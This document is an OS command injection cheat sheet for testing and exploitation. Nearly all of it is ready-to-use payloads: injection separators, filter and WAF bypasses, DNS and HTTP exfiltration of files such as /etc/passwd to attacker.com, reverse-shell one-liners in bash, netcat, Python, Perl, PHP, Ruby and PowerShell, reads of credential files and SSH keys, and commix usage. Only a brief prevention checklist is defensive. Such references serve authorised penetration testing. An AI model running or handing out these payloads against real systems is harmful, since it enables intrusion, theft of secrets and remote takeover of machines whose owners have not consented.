# OS Command Injection - Quick Reference Cheat Sheet

## Command Separators

### Unix/Linux

```bash
# Basic separators
;          # Sequential execution
|          # Pipe output to next command
||         # Execute if previous fails (OR)
&&         # Execute if previous succeeds (AND)
&          # Background execution
%0a        # Newline (URL encoded)
\n         # Newline

# Command substitution
`cmd`      # Backtick substitution
$(cmd)     # Dollar-parenthesis substitution

# Advanced
%0d%0a     # CRLF (URL encoded)
%0d        # Carriage return
%09        # Tab
```

### Windows

```cmd
# Command Prompt
&          # Sequential execution
|          # Pipe output
||         # Execute if previous fails
&&         # Execute if previous succeeds

# PowerShell (also supports semicolon)
;          # Sequential execution
```

## Quick Test Payloads

### Time-Based (Blind Detection)

```bash
# Linux/Unix
||sleep 5||
;sleep 5;
|sleep 5|
`sleep 5`
$(sleep 5)
||ping -c 5 127.0.0.1||
||timeout 5||

# Windows
||timeout /t 5||
||ping -n 6 127.0.0.1||
& timeout /t 5 &
& ping -n 6 127.0.0.1 &
```

### Output-Based (Direct Injection)

```bash
# Unix/Linux
|whoami
;whoami
||whoami||
&&whoami&&
`whoami`
$(whoami)
%0awhoami%0a

# Get more info
|id
|uname -a
|hostname
|pwd
|cat /etc/passwd
```

### Out-of-Band (DNS/HTTP)

```bash
# DNS exfiltration
||nslookup attacker.com||
||dig attacker.com||
||host attacker.com||

# DNS with data
||nslookup `whoami`.attacker.com||
||nslookup $(whoami).attacker.com||

# HTTP exfiltration
||curl http://attacker.com||
||wget http://attacker.com||
||curl http://attacker.com/$(whoami)||

# Burp Collaborator
||nslookup burpcollaborator.net||
||nslookup `whoami`.burpcollaborator.net||
```

## Bypass Techniques

### Space Filtering

```bash
# Using IFS (Internal Field Separator)
cat${IFS}/etc/passwd
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd

# Using tabs
cat%09/etc/passwd

# Brace expansion
{cat,/etc/passwd}

# Using redirect
cat</etc/passwd

# Using $IFS with parameters
cat$IFS/etc/passwd
cat$IFS$9/etc/passwd
```

### Slash Filtering

```bash
# Using environment variables
cat${PATH:0:1}etc${PATH:0:1}passwd
cat${HOME:0:1}etc${HOME:0:1}passwd

# Creating variable
SLASH=/
cat $SLASH etc $SLASH passwd

# Using printf
cat $(printf '\x2f')etc$(printf '\x2f')passwd
```

### Keyword Filtering

```bash
# Using wildcards
/bin/c?t /etc/passwd
/bin/wh*ami
/usr/bin/n?t?at

# Using quotes
c""at /etc/passwd
c''at /etc/passwd
c\at /etc/passwd

# Using variables
a=wh;b=oami;$a$b
CMD=cat;$CMD /etc/passwd

# Using backslashes
wh\oa\mi
c\a\t /etc/passwd

# Base64 encoding
echo d2hvYW1p|base64 -d|bash
echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash

# Character insertion
w$@h$@o$@a$@m$@i
c""a""t /etc/passwd
```

### Semicolon/Pipe Filtering

```bash
# Using newlines
%0awhoami%0a
%0dwhoami%0d
%0d%0awhoami%0d%0a

# Using brace expansion
{cat,/etc/passwd}

# Using variable expansion
${IFS}cat${IFS}/etc/passwd
```

## Data Exfiltration

### File Reading

```bash
# Direct output (if not blind)
|cat /etc/passwd
;cat /etc/shadow
||cat ~/.ssh/id_rsa||

# Output redirection
||whoami>/var/www/html/out.txt||
||cat /etc/passwd>/tmp/data.txt||
||id>>/var/www/images/out.txt||

# Error redirection
||ls /root 2>/var/www/html/err.txt||

# Combined stdout and stderr
||cat /etc/shadow &>/var/www/html/shadow.txt||
```

### DNS Exfiltration

```bash
# Basic data
||nslookup `whoami`.attacker.com||
||nslookup $(hostname).attacker.com||

# File content (small)
||nslookup `cat /etc/hostname`.attacker.com||

# Base64 encoded
||nslookup `cat /etc/passwd|base64|head -1`.attacker.com||

# Character substitution
||nslookup `whoami|tr ':' '-'`.attacker.com||
```

### HTTP Exfiltration

```bash
# GET with path
||curl http://attacker.com/`whoami`||

# GET with parameter
||curl "http://attacker.com/?data=`whoami`"||

# POST with data
||curl -X POST -d "`cat /etc/passwd`" http://attacker.com||

# Base64 in POST
||curl -X POST -d "`cat /etc/passwd|base64`" http://attacker.com||

# Using wget
||wget --post-data="`whoami`" http://attacker.com||
```

## Reverse Shells

### Bash

```bash
# Standard reverse shell
||bash -i >& /dev/tcp/ATTACKER/4444 0>&1||

# Alternative
||bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'||

# Encoded
||echo YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi80NDQ0IDA+JjE=|base64 -d|bash||
```

### Netcat

```bash
# With -e flag
||nc ATTACKER 4444 -e /bin/bash||

# Without -e flag (FIFO)
||rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f||

# OpenBSD netcat
||rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER 4444 >/tmp/f||
```

### Python

```bash
# Python 2
||python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'||

# Python 3
||python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'||
```

### Perl

```bash
||perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'||
```

### PHP

```bash
||php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'||
```

### Ruby

```bash
||ruby -rsocket -e'f=TCPSocket.open("ATTACKER",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'||
```

### PowerShell (Windows)

```powershell
||powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"||
```

## Enumeration Commands

### System Information

```bash
# Basic info
whoami              # Current user
id                  # User ID and groups
hostname            # System hostname
uname -a            # System information
cat /etc/issue      # OS version
cat /etc/*-release  # OS release info
cat /proc/version   # Kernel version

# Windows
whoami
whoami /all
hostname
systeminfo
ver
```

### Network Information

```bash
# Linux
ifconfig            # Network interfaces
ip addr             # IP addresses
ip route            # Routing table
netstat -tulpn      # Listening ports
ss -tulpn           # Socket statistics
arp -a              # ARP table
cat /etc/hosts      # Hosts file
cat /etc/resolv.conf # DNS configuration

# Windows
ipconfig
ipconfig /all
netstat -ano
route print
arp -a
```

### File System

```bash
# Linux
pwd                 # Current directory
ls -la              # List files
find / -type f -name "*.conf" 2>/dev/null  # Find config files
find / -perm -4000 2>/dev/null             # Find SUID files
find / -writable -type d 2>/dev/null       # Writable directories

# Windows
cd
dir
dir /s /b *.config
```

### Users and Groups

```bash
# Linux
cat /etc/passwd     # User accounts
cat /etc/group      # Groups
cat /etc/shadow     # Password hashes (requires root)
w                   # Logged in users
last                # Login history

# Windows
net user
net localgroup administrators
net user /domain
```

### Processes

```bash
# Linux
ps aux              # All processes
ps -ef              # Process tree
top                 # Interactive process viewer
pstree              # Process tree

# Windows
tasklist
tasklist /svc
wmic process list full
```

### Credentials and Secrets

```bash
# Linux
cat ~/.bash_history    # Command history
cat ~/.ssh/id_rsa      # SSH private key
cat ~/.ssh/authorized_keys  # SSH authorized keys
env                    # Environment variables
cat /var/www/html/config.php  # Web app config
grep -r "password" /var/www/  # Search for passwords

# Windows
cmdkey /list
type C:\Windows\Panther\Unattend.xml
reg query HKLM /f password /t REG_SZ /s
```

## Common Vulnerable Parameters

```
# URL Parameters
?id=
?page=
?file=
?path=
?search=
?query=
?cmd=
?exec=
?command=
?ping=
?ip=
?host=

# POST Parameters
filename=
email=
name=
address=
message=
comment=
backup=
template=

# HTTP Headers
User-Agent:
X-Forwarded-For:
X-Real-IP:
Referer:
X-Custom-Header:
```

## Detection Methodology

### Manual Testing Workflow

1. **Identify injection points** - All user-controlled input
2. **Test time-based detection** - `||sleep 5||`
3. **Test output-based** - `|whoami`
4. **Test out-of-band** - DNS/HTTP callbacks
5. **Confirm with multiple payloads**
6. **Document findings**

### Burp Suite Workflow

1. **Proxy** → Intercept request
2. **Send to Repeater** → Test payloads
3. **Collaborator** → Out-of-band testing
4. **Intruder** → Automated payload testing
5. **Scanner** → Active scan for vulnerabilities

## Tools

### Commix

```bash
# Basic usage
commix --url="http://target.com/page?id=1"

# POST parameters
commix --url="http://target.com/submit" --data="email=test" -p email

# Cookie testing
commix --url="http://target.com/page" --cookie="sessionid=abc123"

# Execute command
commix --url="http://target.com/page?id=1" --os-cmd="whoami"

# Interactive shell
commix --url="http://target.com/page?id=1" --os-shell

# File operations
commix --url="http://target.com/page?id=1" --file-read="/etc/passwd"

# With proxy
commix --url="http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"
```

### cURL Testing

```bash
# GET request
curl "http://target.com/page?id=1||whoami||"

# POST request
curl -X POST "http://target.com/submit" -d "email=test||whoami||"

# Time measurement
time curl -X POST "http://target.com/submit" -d "email=test||sleep 5||"

# With cookies
curl "http://target.com/page" -b "sessionid=abc123" -d "param=test||whoami||"

# Custom headers
curl "http://target.com/page" -H "X-Forwarded-For: 127.0.0.1||whoami||"
```

## Prevention Checklist

- [ ] **Avoid OS commands** - Use native APIs instead
- [ ] **Parameterized execution** - Never concatenate user input with commands
- [ ] **Input validation** - Allowlist only safe characters
- [ ] **Command allowlist** - Only permit specific pre-defined commands
- [ ] **Principle of least privilege** - Run with minimal permissions
- [ ] **WAF deployment** - Block malicious patterns
- [ ] **Security logging** - Monitor for suspicious input
- [ ] **Code review** - Search for dangerous functions
- [ ] **Security testing** - Include in SAST/DAST
- [ ] **Keep updated** - Patch known vulnerabilities

## Dangerous Functions by Language

### PHP
```php
system()
exec()
shell_exec()
passthru()
popen()
proc_open()
backticks (``)
eval()
assert()
```

### Python
```python
os.system()
os.popen()
subprocess.call(shell=True)
subprocess.Popen(shell=True)
eval()
exec()
execfile()
```

### Java
```java
Runtime.exec()
ProcessBuilder.start()
```

### Node.js
```javascript
child_process.exec()
child_process.spawn()
child_process.execFile()
child_process.fork()
eval()
```

### Ruby
```ruby
system()
exec()
`backticks`
%x{command}
IO.popen()
Kernel.open("|command")
```

### Perl
```perl
system()
exec()
`backticks`
open("|command")
```

## Encoding Reference

### URL Encoding

```
Space     = %20 or +
;         = %3b
|         = %7c
&         = %26
$         = %24
>         = %3e
<         = %3c
`         = %60
\         = %5c
!         = %21
(         = %28
)         = %29
Newline   = %0a
Tab       = %09
CRLF      = %0d%0a
```

### Base64 Encoding

```bash
# Encode
echo "whoami" | base64
# Output: d2hvYW1pCg==

# Decode and execute
echo d2hvYW1pCg==|base64 -d|bash

# Common commands (base64)
whoami        = d2hvYW1p
cat /etc/passwd = Y2F0IC9ldGMvcGFzc3dk
id            = aWQ=
uname -a      = dW5hbWUgLWE=
```

### Hex Encoding

```bash
# Using echo -e
echo -e "\x77\x68\x6f\x61\x6d\x69"  # whoami

# Using printf
printf "\x77\x68\x6f\x61\x6d\x69"   # whoami
```

## Environment Variables

### Useful for Bypass

```bash
# Internal Field Separator
${IFS}              # Space character
$IFS$9              # Space with empty variable

# PATH manipulation
${PATH:0:1}         # First character of PATH (/)
${HOME:0:1}         # First character of HOME (/)

# Empty variables
${RANDOM:0:0}       # Empty string
$9                  # Empty positional parameter

# Common variables
$USER               # Current user
$HOME               # Home directory
$PWD                # Current directory
$HOSTNAME           # Hostname
```

## WAF Bypass Techniques

```bash
# Case variation (Windows)
WhOaMi
CAT C:\file.txt

# Character insertion
w$@h$@o$@a$@m$@i
c""a""t /etc/passwd

# Wildcard usage
/???/c?t /???/p??s??
/bin/n?*at

# Encoding
%77%68%6f%61%6d%69  # URL encoded whoami

# Concatenation
a=who;b=ami;$a$b
who$()ami

# Newlines instead of spaces
cat%0a/etc/passwd

# Tabs instead of spaces
cat%09/etc/passwd

# Using less common separators
cat</etc/passwd
```

## Testing Priority

1. **Time-based blind** (most reliable)
   - `||sleep 5||`

2. **Output-based** (fastest confirmation)
   - `|whoami`

3. **Out-of-band** (bypasses output filtering)
   - `||nslookup attacker.com||`

4. **File-based** (for persistent access)
   - `||whoami>/var/www/html/out.txt||`

## Quick Reference URLs

- **PortSwigger Labs**: https://portswigger.net/web-security/os-command-injection
- **OWASP Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- **Commix GitHub**: https://github.com/commixproject/commix
- **HackTricks**: https://book.hacktricks.xyz/pentesting-web/command-injection

---

*Quick reference for OS command injection testing and exploitation*
